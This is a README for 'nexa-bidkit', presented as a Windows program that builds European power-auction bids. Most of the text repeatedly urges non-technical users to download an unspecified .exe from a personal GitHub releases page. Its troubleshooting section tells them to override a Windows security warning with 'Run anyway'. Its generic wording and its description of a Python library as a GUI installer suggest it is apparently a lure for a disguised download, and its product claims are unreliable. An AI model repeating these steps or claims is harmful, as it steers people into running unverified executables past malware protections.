# ⚡ nexa-bidkit - Simple Bidding Tool for Power Auctions

[![Download Latest Release](https://img.shields.io/badge/Download-nexa--bidkit-blue?style=for-the-badge)](https://github.com/fhum6443/nexa-bidkit/releases)

---

## 🔍 What is nexa-bidkit?

nexa-bidkit is a tool designed to help you create bids for European power markets. It works with both day-ahead and intraday auctions. You don’t need to know how auctions or energy markets work to get started. This tool builds bids based on time slots of 15 minutes, which fits modern market requirements.

You can think of it as a calculator specifically made for power market bids. It helps you prepare bids that follow rules for things like block bids and linked orders. The results you get are ready for systems that use EUPHEMIA, the standard tool for market clearing in many European countries.

---

## 🖥️ System Requirements

Before you start, make sure your computer meets these needs:

- Windows 10 or later (64-bit version recommended)
- At least 4 GB of free RAM
- 200 MB of free space on your hard drive
- Internet connection to download the program and updates

No special devices or software are required. Everything needed to run nexa-bidkit is included in the download.

---

## 🎯 Key Features

- Build auction bids for 15-minute market time units (MTUs)  
- Support for block bids (bids that cover several time slots as a single unit)  
- Handle linked orders (bids that depend on each other)  
- Create exclusive groups to prevent conflicting bids  
- Output bids in EUPHEMIA-compatible formats  
- Designed for European power markets including ENTSO-E and Nord Pool  
- Works with both day-ahead and intraday auctions  
- Uses common data formats to ensure smooth integration  

---

## 🚀 Getting Started

Follow these steps to get nexa-bidkit running on your Windows computer.

### 1. Download the Software

You need to visit the releases page to get the latest version.

[![Download Latest Release](https://img.shields.io/badge/Download-nexa--bidkit-green?style=for-the-badge)](https://github.com/fhum6443/nexa-bidkit/releases)

Open the link above. Look for a file with an `.exe` extension or a Windows installer. Click on it and choose where to save it on your computer.

---

### 2. Install the Software

After the download is complete, find the file you saved (usually in Downloads). Double-click the file to start installation.

A setup window will appear. Follow these instructions:

- Click "Next" on the welcome screen  
- Choose the folder where you want to install (the default is usually fine)  
- Click "Install" to start copying files  

Wait until the installation finishes. Once done, you can close the installer.

---

### 3. Start Using nexa-bidkit

To open the program:

- Click the Start menu  
- Search for "nexa-bidkit"  
- Click the application icon to open it  

The program presents a simple interface to create and manage bids. It shows options for setting your bid type (day-ahead or intraday), selecting time slots, and adding details for block bids or linked orders.

---

### 4. Create Your First Bid

On the main screen:

- Select **Day-Ahead** or **Intraday** auction mode  
- Pick the date and time slots you want to bid on  
- Add the value or amount you want to bid for each time slot  
- Use the "Block Bid" section if you want to combine multiple slots as one offer  
- Link orders if your bids depend on each other by choosing the "Linked Orders" tab  

The program shows you a summary of your bids before you export them.

---

### 5. Export Your Bids

Once your bids are ready, export them in the correct format for your market operator. The tool saves them as files compatible with EUPHEMIA systems.

- Click the "Export" button  
- Choose where to save your bid file  
- Upload the file to the marketplace portal (e.g., EPEX SPOT or Nord Pool) per their instructions

---

## ⚙️ How It Works Under the Hood

nexa-bidkit uses Python code internally, but you don’t need to know Python or any programming.

It takes your input and builds complex bids from simple choices. For example:

- When you select a block bid, the tool groups connected time slots as one single bid  
- Linked orders help you set conditions between bids like "I only want to sell if another bid goes through"  
- The 15-minute MTU support means bids match the latest market segmentation, improving your chances  

The tool also uses `pandas`, a Python library, to organize your data quickly and correctly. But this happens behind the scenes.

---

## 🔧 Troubleshooting Tips

- The program may need permission to run on Windows. If you see a security warning, click "More info" and then "Run anyway."  
- Make sure you install the correct version for Windows (64-bit recommended).  
- If bids don’t export properly, check you have write permission to the folder you chose.  
- For questions on how to create specific bids, look for guides on day-ahead auctions or block bids from your market operator.  
- The software works offline after installation, but downloading updates requires internet access.

---

## 📂 Download and Install Link

Visit this page to download nexa-bidkit for Windows:

[https://github.com/fhum6443/nexa-bidkit/releases](https://github.com/fhum6443/nexa-bidkit/releases)

This page always has the latest versions available. Look for files named with `.exe` for Windows installation.

---

## ⚡ Quick Tips for Non-Technical Users

- Take your time reading each step inside the program.  
- Start with small bids to learn how the tool works.  
- Use block bids only if you understand that they cover multiple slots.  
- Reach out to your energy market’s helpdesk if you get stuck with auction rules.  
- Save copies of exported bid files before submitting to any marketplace.  

---

## 🧰 More Information

If you want to understand more about how bids and auctions work, search for terms like:

- "Day-Ahead Power Auctions"  
- "Intraday Market Bids"  
- "Block Bids Electricity Markets"  
- "EUPHEMIA Market Coupling"  

You can also explore the list of topics this software supports, including energy market trading, linked bids, and market coupling.

---

## 🔗 Useful Links

- Releases page for downloads: https://github.com/fhum6443/nexa-bidkit/releases  
- ENTSO-E: https://www.entsoe.eu/  
- EPEX SPOT: https://www.epexspot.com/  
- Nord Pool: https://www.nordpoolgroup.com/  

---

This README is designed to guide you clearly through downloading and running nexa-bidkit on Windows. Follow the steps patiently, and you will be able to create auction bids suited for European power markets.